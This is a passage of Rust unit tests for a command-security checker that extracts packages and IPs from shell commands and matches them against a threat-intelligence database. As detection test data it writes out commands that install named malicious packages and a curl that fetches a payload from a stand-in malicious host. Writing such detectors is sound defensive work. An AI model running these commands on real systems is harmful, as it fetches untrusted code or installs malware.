        let pkgs = tokenize_and_extract("echo hello world");
        assert!(pkgs.is_empty());
    }

    #[test]
    fn piped_commands_both_extracted() {
        let pkgs = tokenize_and_extract("pip install requests && npm install lodash");
        assert_eq!(pkgs.len(), 2);
        assert_eq!(pkgs[0].ecosystem, Ecosystem::PyPI);
        assert_eq!(pkgs[0].name, "requests");
        assert_eq!(pkgs[1].ecosystem, Ecosystem::Npm);
        assert_eq!(pkgs[1].name, "lodash");
    }

    #[test]
    fn ipv4_bare() {
        let ip = extract_ipv4_from_token("1.2.3.4");
        assert_eq!(ip, Some(Ipv4Addr::new(1, 2, 3, 4)));
    }

    #[test]
    fn ipv4_with_user() {
        let ip = extract_ipv4_from_token("user@192.168.1.1");
        assert_eq!(ip, Some(Ipv4Addr::new(192, 168, 1, 1)));
    }

    #[test]
    fn ipv4_with_port() {
        let ip = extract_ipv4_from_token("10.0.0.1:22");
        assert_eq!(ip, Some(Ipv4Addr::new(10, 0, 0, 1)));
    }

    #[test]
    fn ipv4_with_user_and_port() {
        let ip = extract_ipv4_from_token("root@10.0.0.1:22");
        assert_eq!(ip, Some(Ipv4Addr::new(10, 0, 0, 1)));
    }

    #[test]
    fn ipv4_localhost() {
        let ip = extract_ipv4_from_token("127.0.0.1");
        assert_eq!(ip, Some(Ipv4Addr::new(127, 0, 0, 1)));
    }

    #[test]
    fn ipv4_not_an_ip() {
        let ip = extract_ipv4_from_token("hello");
        assert!(ip.is_none());
    }

    #[test]
    fn ipv4_partial_not_valid() {
        let ip = extract_ipv4_from_token("1.2.3");
        assert!(ip.is_none());
    }

    #[test]
    fn ipv4_out_of_range() {
        let ip = extract_ipv4_from_token("999.999.999.999");
        assert!(ip.is_none());
    }

    #[test]
    fn ipv6_not_matched() {
        assert!(extract_ipv4_from_token("::1").is_none());
        assert!(extract_ipv4_from_token("2001:db8::1").is_none());
        assert!(extract_ipv4_from_token("fe80::1%eth0").is_none());
    }

    #[test]
    fn ipv4_empty_string() {
        let ip = extract_ipv4_from_token("");
        assert!(ip.is_none());
    }

    #[test]
    fn ipv4_in_brackets() {
        let ip = extract_ipv4_from_token("[10.0.0.1]");
        assert_eq!(ip, Some(Ipv4Addr::new(10, 0, 0, 1)));
    }

    #[test]
    fn ipv4_shell_quotes_and_escapes_are_normalized() {
        for (token, shell) in [
            ("'203.0.113.50'", ShellType::Posix),
            (r#""203.0.113.50""#, ShellType::Posix),
            (r"203\.0\.113\.50", ShellType::Posix),
            ("$'203.0.113.50'", ShellType::Posix),
            ("'203.0.113.50'", ShellType::PowerShell),
            (r#""203.0.113.50""#, ShellType::Cmd),
        ] {
            assert_eq!(
                extract_ipv4_from_token_for_shell(token, shell),
                Some(Ipv4Addr::new(203, 0, 113, 50)),
                "quoted IP missed for {shell:?}: {token}"
            );
        }
    }

    #[test]
    fn quotes_that_survive_shell_evaluation_are_not_removed_twice() {
        assert!(
            extract_ipv4_from_token_for_shell(r#""'203.0.113.50'""#, ShellType::Posix).is_none()
        );
    }

    #[test]
    fn check_returns_empty_without_db() {
        let findings = check("pip install malicious-pkg", ShellType::Posix, &[], None);
        assert!(findings.is_empty(), "check() must be fail-open without DB");
    }

    #[test]
    fn command_to_threatdb_uses_registry_package_and_version_identity() {
        let key = SigningKey::generate(&mut OsRng);
        let mut writer = ThreatDbWriter::new(1_700_000_000, 88);
        for (eco, name, version) in [
            (Ecosystem::PyPI, "malware-pkg", "1.0rc1"),
            (Ecosystem::NuGet, "Newtonsoft.JSON", "13.0.3"),
            (Ecosystem::Crates, "partial_sort", "0.1.0"),
        ] {
            writer.add_package(
                eco,
                name,
                &[version],
                ThreatSource::OssfMalicious,
                Confidence::Confirmed,
                false,
                None,
            );
        }
        let db = ThreatDb::from_bytes(writer.build(&key).expect("build"), 0).expect("load");

        for command in [
            "pip install Malware__Pkg==v1.0RC01",
            "dotnet add package newtonsoft.json --version 13.0.3",
            "cargo install Partial-Sort --version =0.1.0",
        ] {
            let findings = check(command, ShellType::Posix, &[], Some(&db));
            assert!(
                findings.iter().any(|finding| {
                    finding.rule_id == RuleId::ThreatMaliciousPackage
                        && finding.severity == Severity::Critical
                }),
                "{command}: {findings:?}"
            );
        }
    }

    #[test]
    fn overlapping_claims_enforce_strongest_evidence_in_both_formats_and_orders() {
        let key = SigningKey::from_bytes(&[23u8; 32]);
        for format in [ThreatDbFormat::V1, ThreatDbFormat::V2] {
            for all_versions_first in [false, true] {
                let mut writer = ThreatDbWriter::new(1_700_000_000, 95);
                let add_exact = |writer: &mut ThreatDbWriter| {
                    writer.add_package(
                        Ecosystem::PyPI,
                        "enforcement.pkg",
                        &["1.0"],
                        ThreatSource::OssfMalicious,
                        Confidence::Confirmed,
                        false,
                        Some("https://osv.dev/vulnerability/MAL-2026-0001"),
                    );
                };
                let add_all_versions = |writer: &mut ThreatDbWriter| {
                    writer.add_package(
                        Ecosystem::PyPI,
                        "enforcement__pkg",
                        &[],
                        ThreatSource::DatadogMalicious,
                        Confidence::Medium,
                        true,
                        Some("https://example.invalid/all-versions"),
                    );
                };
                if all_versions_first {
                    add_all_versions(&mut writer);
                    add_exact(&mut writer);
                } else {
                    add_exact(&mut writer);
                    add_all_versions(&mut writer);
                }
                let db = ThreatDb::from_bytes(
                    writer.build_format(format, &key).expect("build threat DB"),
                    0,
                )
                .expect("load threat DB");

                let exact_findings = check(
                    "pip install enforcement-pkg==1.0",
                    ShellType::Posix,
                    &[],
                    Some(&db),
                );
                let exact = exact_findings
                    .iter()
                    .find(|finding| finding.rule_id == RuleId::ThreatMaliciousPackage)
                    .expect("overlapping exact claim must produce a finding");
                assert_eq!(exact.severity, Severity::Critical);
                assert!(exact.description.contains("Specific version(s) affected."));
                let Evidence::ThreatIntel {
                    source,
                    confidence,
                    reference,
                    ..
                } = &exact.evidence[0]
                else {
                    panic!("expected threat-intel evidence");
                };
                assert_eq!(source, ThreatSource::OssfMalicious.label());
                assert_eq!(*confidence, Confidence::Confirmed);
                assert_eq!(
                    reference.as_deref(),
                    Some("https://osv.dev/vulnerability/MAL-2026-0001")
                );
                assert_eq!(
                    crate::verdict::action_from_findings(&exact_findings),
                    crate::verdict::Action::Block
                );

                let unrelated_findings = check(
                    "pip install enforcement-pkg==99.0",
                    ShellType::Posix,
                    &[],
                    Some(&db),
                );
                let unrelated = unrelated_findings
                    .iter()
                    .find(|finding| finding.rule_id == RuleId::ThreatMaliciousPackage)
                    .expect("all-version claim must cover an unrelated version");
                assert_eq!(unrelated.severity, Severity::Medium);
                assert!(unrelated.description.contains("All versions are affected."));
                let Evidence::ThreatIntel {
                    source,
                    confidence,
                    reference,
                    ..
                } = &unrelated.evidence[0]
                else {
                    panic!("expected threat-intel evidence");
                };
                assert_eq!(source, ThreatSource::DatadogMalicious.label());
                assert_eq!(*confidence, Confidence::Medium);
                assert_eq!(
                    reference.as_deref(),
                    Some("https://example.invalid/all-versions")
                );
                assert_eq!(
                    crate::verdict::action_from_findings(&unrelated_findings),
                    crate::verdict::Action::Warn
                );
            }
        }
    }

    #[test]
    fn digit_leading_resolver_selectors_emit_unresolved_warning() {
        let key = SigningKey::generate(&mut OsRng);
        let mut writer = ThreatDbWriter::new(1_700_000_000, 89);
        for (eco, name) in [
            (Ecosystem::Npm, "evil-npm"),
            (Ecosystem::Go, "example.com/evil-go"),
        ] {
            writer.add_package(
                eco,
                name,
                &[if eco == Ecosystem::Go {
                    "v1.2.3"
                } else {
                    "1.2.3"
                }],
                ThreatSource::OssfMalicious,
                Confidence::Confirmed,
                false,
                None,
            );
        }
        let db = ThreatDb::from_bytes(writer.build(&key).expect("build"), 0).expect("load");

        for command in [
            "npm install evil-npm@1stable",
            "go install example.com/evil-go@123abc",
        ] {
            let findings = check(command, ShellType::Posix, &[], Some(&db));
            assert!(
                findings.iter().any(|finding| {
                    finding.rule_id == RuleId::ThreatUnresolvedMaliciousPackage
                        && finding.severity == Severity::Medium
                }),
                "{command}: {findings:?}"
            );
            assert!(!findings
                .iter()
                .any(|finding| finding.rule_id == RuleId::ThreatMaliciousPackage));
        }
    }

    #[test]
    fn hostname_rule_urlhaus_maps_to_malicious_url() {
        let (rule, sev, _) = hostname_rule_for_source(threatdb::ThreatSource::Urlhaus);
        assert_eq!(rule, RuleId::ThreatMaliciousUrl);
        assert_eq!(sev, Severity::High);
    }

    #[test]
    fn trailing_dot_hostname_alias_remains_a_high_threat_match() {
        let key = SigningKey::generate(&mut OsRng);
        let mut writer = ThreatDbWriter::new(1_700_000_000, 97);
        writer.add_hostname("malicious.example", ThreatSource::Urlhaus);
        let db = ThreatDb::from_bytes(writer.build(&key).expect("build"), 0).expect("load");
        let command = "curl https://MALICIOUS.EXAMPLE./payload";
        let extracted = crate::extract::extract_urls(command, ShellType::Posix);

        let findings = check(command, ShellType::Posix, &extracted, Some(&db));
        let finding = findings
            .iter()
            .find(|finding| finding.rule_id == RuleId::ThreatMaliciousUrl)
            .expect("the command-facing lookup must match a DNS-equivalent trailing-dot alias");
        assert_eq!(finding.severity, Severity::High);
        assert_eq!(
            crate::verdict::action_from_findings(&findings),
            crate::verdict::Action::Block
        );
    }

    #[test]
    fn hostname_rule_phishing_sources_map_to_phishing_url() {
        for source in [
            threatdb::ThreatSource::PhishingArmy,
            threatdb::ThreatSource::PhishTank,
        ] {
            let (rule, sev, _) = hostname_rule_for_source(source);
            assert_eq!(rule, RuleId::ThreatPhishingUrl);
            assert_eq!(sev, Severity::High);
        }
    }

    #[test]
    fn hostname_rule_threatfox_maps_to_ioc() {
        let (rule, sev, _) = hostname_rule_for_source(threatdb::ThreatSource::ThreatFoxIoc);
        assert_eq!(rule, RuleId::ThreatThreatFoxIoc);
        assert_eq!(sev, Severity::High);
    }

    #[test]
    fn ip_rule_tor_exit_maps_to_medium() {
        let (rule, sev, _) = ip_rule_for_source(threatdb::ThreatSource::TorExit);
        assert_eq!(rule, RuleId::ThreatTorExitNode);
        assert_eq!(sev, Severity::Medium);
    }

    #[test]
    fn ip_rule_threatfox_maps_to_ioc() {
        let (rule, sev, _) = ip_rule_for_source(threatdb::ThreatSource::ThreatFoxIoc);
        assert_eq!(rule, RuleId::ThreatThreatFoxIoc);
        assert_eq!(sev, Severity::High);
    }

    #[test]
    fn ip_rule_feodo_maps_to_malicious_ip() {
        let (rule, sev, _) = ip_rule_for_source(threatdb::ThreatSource::FeodoTracker);
        assert_eq!(rule, RuleId::ThreatMaliciousIp);
        assert_eq!(sev, Severity::High);
    }

    #[test]
    fn digitalside_maps_to_generic_malicious_rules() {
        // DigitalSide is a generic IoC feed: hostnames route to ThreatMaliciousUrl
        // and IPs to ThreatMaliciousIp, both High, like the other IoC sources.
        let (host_rule, host_sev, _) =
            hostname_rule_for_source(threatdb::ThreatSource::DigitalSide);
        assert_eq!(host_rule, RuleId::ThreatMaliciousUrl);
        assert_eq!(host_sev, Severity::High);

        let (ip_rule, ip_sev, _) = ip_rule_for_source(threatdb::ThreatSource::DigitalSide);
        assert_eq!(ip_rule, RuleId::ThreatMaliciousIp);
        assert_eq!(ip_sev, Severity::High);
    }
}
